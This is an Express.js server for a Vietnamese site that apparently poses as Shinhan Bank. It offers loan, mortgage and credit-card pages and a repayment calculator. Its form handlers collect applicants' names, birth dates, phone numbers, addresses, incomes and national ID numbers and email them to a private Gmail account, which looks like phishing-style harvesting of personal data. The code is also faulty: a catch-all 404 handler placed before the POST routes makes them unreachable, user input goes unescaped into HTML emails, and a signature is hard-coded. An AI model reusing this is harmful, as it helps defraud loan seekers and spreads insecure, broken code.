const express = require('express');
const exphbs = require('express-handlebars');
var mailer = require('./utils/mailer');
const app = express();
var bodyParser = require('body-parser');
var jsonParser = bodyParser.json();
app.use(bodyParser.urlencoded({ extended: false }))
app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');
app.use('/public',express.static(__dirname + '/public'));



app.get('/home', function (req, res) {
    res.render('home');
});
app.get('/', function (req, res) {
    res.render('home');
});

app.get('/gioi-thieu', function (req, res) {
    res.render('infor');
});

app.get('/ho-tro-cong-nhan-va-tu-doanh', function (req, res) {
    res.render('support');
});

app.get('/vay-the-chap-nha-dat', function (req, res) {
    res.render('mortgage');
});

app.get('/the-tin-dung-shinhanbank', function (req, res) {
    res.render('creditcard');
});

app.get('/vay-tieu-dung', function (req, res) {
    res.render('consumption');
});

app.get('/san-pham-dich-vu-shinhanbank', function (req, res) {
    res.render('services');
});

app.get('/lien-he', function (req, res) {
    res.render('contact');
});

app.get('/webhook',function (req, res){
    var signature = "bd8827760bd833763acd8f17882c099cba8350cce7132377a892a282c5cff944";
    var DataInput  = req.body;
    console.log(DataInput.length);
    res.render('webhook',{Data: DataInput, NotExists: DataInput.length===undefined});
})

app.use(function(req, res,next){
    res.status(404).render('404');
})



app.post('/dangki',jsonParser, function(req, res)
{
    const customer=
    {
        ten: req.body.name,
        coquan: req.body.coquan,
        sdt: req.body.sodienthoai,
        diachi: req.body.diachi,
        thunhap: req.body.thunhap,
        sotien: req.body.sotien,
        socmnd: req.body.socmnd,
        ngaysinh: req.body.ngaysinh,
        hinhthuc: req.body.hinhthuc
    }
    res.json();
    mailer.send({
        from: 'shinhanbankautomail@gmail.com',
        to: `vayshinhanbankvn@gmail.com`,
        subject: 'Thông tin vay vốn của khách hàng',
        html: `
        Xin chào, dưới đây là thông tin liên lạc của khách hàng gửi cho bạn từ trang web shinhanbank<br>
        Họ tên khách hàng: ${customer.ten}<br> 
        Ngày sinh: ${customer.ngaysinh}<br> 
        Số điện thoại: ${customer.sdt}<br> 
        Địa chỉ: ${customer.diachi}<br> 
        Cơ quan: ${customer.coquan}<br> 
        Số chứng minh nhân dân:${customer.socmnd}<br> 
        Thu nhập hàng tháng: ${customer.thunhap}<br>
        Số tiên cần vay:${customer.sotien}<br> 
        Hình thức nhận: ${customer.hinhthuc}<br>
        (Đây là thư tự động vui lòng không phản hồi)
        `
    });
});

app.post('/lien-he',jsonParser, function(req, res)
{
    var customer = req.body;
    res.json();
    mailer.send({
        from: 'shinhanbankautomail@gmail.com',
        to: `vayshinhanbankvn@gmail.com`,
        subject: 'Thông tin liên hệ của khách hàng',
        html: `
        Xin chào, dưới đây là thông tin liên hệ của khách hàng gửi cho bạn từ trang web shinhanbank<br>
        Họ tên khách hàng: ${customer.name}<br> 
        Số điện thoại: ${customer.sdt}<br> 
        Email: ${customer.mail}<br> 
        Ghi chú gửi cho bạn: ${customer.ghichu}<br>
        (Đây là thư tự động vui lòng không phản hồi)
        `
    });
});


app.post('/bangtinh',jsonParser, function(req, res){
    //So tien * 0.8%/thang;
    //So tien * 18%/nam;
    var soTienVay = req.body.tienvay;
    var thoiHan = req.body.thoihan;
    var thang = thoiHan % 12;
    var nam = Math.floor(thoiHan / 12);
    var soTienTraHangThang = soTienVay/thoiHan + ((soTienVay*0.8)/100);
    var tongTien = Math.ceil((soTienTraHangThang*thoiHan));
    var output;
    var output2;
    if(soTienVay>456)
    {
        output= new Intl.NumberFormat('vn-VN', { style: 'currency', currency: 'VND' }).format(soTienTraHangThang);
        output2 = new Intl.NumberFormat('vn-VN', { style: 'currency', currency: 'VND' }).format(tongTien);
    }
    else
    {
        output = 0;
        output2=0;
    }
   
    res.json(`<p style="font-weight: 700;">Tổng Hàng Tháng Phải Trả: <span style="color: #fe9901;">${output}</span></p> <p style="font-weight: 700;">Tổng Tiền: <span style="color: #fe9901;">${output2}</span></p><p>* Số liệu trên chỉ mang tính chất tham khảo. Có thể thay đổi tùy theo công việc của bạn.</p>`);
});




const PORT = process.env.PORT || 3000;
app.listen(PORT,function(){
    console.log(`Server is running at http://localhost:${PORT}`);
})